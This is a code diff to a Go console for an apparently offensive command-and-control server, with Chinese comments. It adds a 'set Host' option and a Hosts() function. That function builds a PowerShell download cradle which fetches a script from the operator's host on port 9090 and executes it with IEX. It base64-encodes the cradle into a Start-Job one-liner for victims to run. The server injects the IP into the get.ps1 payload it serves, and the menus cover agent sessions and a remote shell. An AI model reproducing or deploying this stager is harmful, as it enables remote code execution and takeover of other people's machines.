@@ -14,6 +14,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/AlecAivazis/survey"
 	"github.com/fatih/color"
 	"github.com/olekukonko/tablewriter"
 
@@ -41,6 +42,7 @@ var (
 	cmd                                      string = ""
 	AGENTS                                   map[string]string
 	session_id                               string = ""
+	Host                                     string = ""
 	//全局变量
 )
 
@@ -151,13 +153,15 @@ func httpserver(w http.ResponseWriter, r *http.Request) {
 		fmt.Fprintf(w, ("ok upload"))
 
 	} else if url_get.MatchString(r.URL.Path) {
+		//get payload get.PS1
 		ps1, err := ioutil.ReadFile("./get.ps1")
+		payload := strings.Replace(string(ps1), "{ip}", Host, -1)
 		if err != nil {
 			fmt.Println("Read file error", err)
 			fmt.Fprintln(w, "")
 			return
 		} else {
-			fmt.Fprintln(w, string(ps1))
+			fmt.Fprintln(w, payload)
 		}
 	} else {
 		//全都不匹配输出请求详细
@@ -306,10 +310,11 @@ func clear() {
 
 func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表
 	s := []prompt.Suggest{
-		{Text: "shell"},
 		{Text: "help"},
+		{Text: "set Host"},
 		{Text: "session list"},
 		{Text: "Interact", Description: "Interact with AGENT"},
+		{Text: "shell"},
 		{Text: "exit"},
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
@@ -320,11 +325,35 @@ func Session_id(id string) {
 	Red := color.New(color.FgRed).SprintFunc()
 	if len(strings.Split(id, " ")) > 1 {
 		session_id = strings.Split(id, " ")[1]
-		fmt.Printf("%s setting Interact session id => %s.\n", Blue("[*]"), session_id)
+		fmt.Printf("%s setting Session id=> %s.\n", Blue("[*]"), session_id)
 	} else {
-		fmt.Printf("%s set session err \n", Red("[*]"))
+		fmt.Printf("%s set Session id err \n", Red("[*]"))
 	}
 
+}
+
+func Hosts() {
+	Blue := color.New(color.FgBlue).SprintFunc() //颜色设定 https://github.com/fatih/color
+
+	prompt := &survey.Input{
+		Message: "set ip",
+	}
+
+	survey.AskOne(prompt, &Host, survey.WithIcons(func(icons *survey.IconSet) {
+
+		icons.Question.Text = "メ "
+		icons.Question.Format = "red+hb"
+
+	}))
+	fmt.Printf("%s setting listener => %s:9090 \n", Blue("[*]"), Host) //https://github.com/fatih/color
+	// fmt.Printf("%s mshta http://%s:9090/hta \n", Blue("[☠ ]"), Host)   //https://github.com/fatih/color
+	payload := "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('http://" + Host + ":9090/get');IEX($s)"
+
+	strbytes := []byte(payload)
+	encoded := base64.StdEncoding.EncodeToString(strbytes)
+	// fmt.Println(encoded)
+	commandJ := "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('" + encoded + "')))}"
+	fmt.Println(commandJ)
 }
 
 func Options() { //定义tab 下拉菜单选项参数
@@ -350,30 +379,10 @@ func Options() { //定义tab 下拉菜单选项参数
 		} else if options == "exit" {
 			os.Exit(0)
 			break
-		} else {
-			fmt.Println("错误选项")
+		} else if options == "set Host" {
+			Hosts()
 		}
-		//switch {
-		//
-		//case options == "shell":
-		//	for true {
-		//		fmt.Print("Console_shell >")
-		//		Scanf(&cmd)
-		//
-		//	}
-		//case options == "help":
-		//	fmt.Println(help)
-		//case options == "Interact":
-		//	Session_id(options)
-		//case options == "session list":
-		//	info_os()
-		//case options == "exit":
-		//	os.Exit(0)
-		//	break
-		//default:
-		//	fmt.Println("错误选项")
-		//
-		//}
+
 	}
 
 }
